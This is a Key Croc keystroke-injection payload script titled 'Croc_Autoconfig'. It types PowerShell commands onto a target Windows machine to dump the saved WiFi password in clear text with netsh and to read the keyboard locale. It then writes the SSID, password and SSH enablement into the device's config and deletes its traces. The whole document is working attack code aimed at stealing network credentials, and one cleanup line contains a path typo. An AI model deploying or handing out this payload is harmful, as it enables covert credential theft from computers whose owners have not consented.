# Title:           Croc_Autoconfig
# Description:     Exfiltrate keyboard-layout and WIFI configuration from target
#                  and set config.txt accordingly
# Author:          MarkB
# Version:         1.0
# Category:        Key Croc

# Config parameters
name_line=11
pass_line=33

# ATTACK SCRIPT
ATTACKMODE STORAGE HID
Q DELAY 8000
LED ATTACK
Q GUI r
Q DELAY 1500
Q STRING powershell.exe
Q ENTER
Q DELAY 1500

# Get actual WIFI configuration
Q STRING "netsh wlan show profile name=(Get-NetConnectionProfile).Name[0] key=clear | Set-Content -Path (Join-Path (Get-PSDrive -Name (Get-Volume -FileSystemLabel KeyCroc).DriveLetter).Root \"WLAN.txt\")"
Q ENTER
Q DELAY 3000

# Get keyboard layout
Q STRING "(Get-Culture).Name | Set-Content -Path (Join-Path (Get-PSDrive -Name (Get-Volume -FileSystemLabel KeyCroc).DriveLetter).Root \"KEYBOARD.txt\")"
Q ENTER
Q DELAY 1000

# Close powershell
Q STRING exit
Q ENTER


# Parse Data and create config.txt
ATTACKMODE HID
LED Y
name=`head -$name_line WLAN.txt | tail -1 | cut -d ":" -f 2 | sed 's/^\s*\|\s*$//g'`
pass=`head -$pass_line WLAN.txt | tail -1 | cut -d ":" -f 2 | sed 's/^\s*\|\s*$//g'`
lang=`cat KEYBOARD.txt | cut -d "-" -f 2`

echo "DUCKY_LANG $lang" > /root/udisk/config.txt
echo "WIFI_SSID $name" >> /root/udisk/config.txt
echo "WIFI_PASS $pass" >> /root/udisk/config.txt
echo "SSH ENABLE" >> /root/udisk/config.txt

# Deactivate payload, cleanup and reboot
mv /root/udisk/payloads/autoconfig_croc.txt /root/udisk/library/examples/
rm /root/udiks/WLAN.txt
rm /root/udisk/KEYBOARD.txt
LED G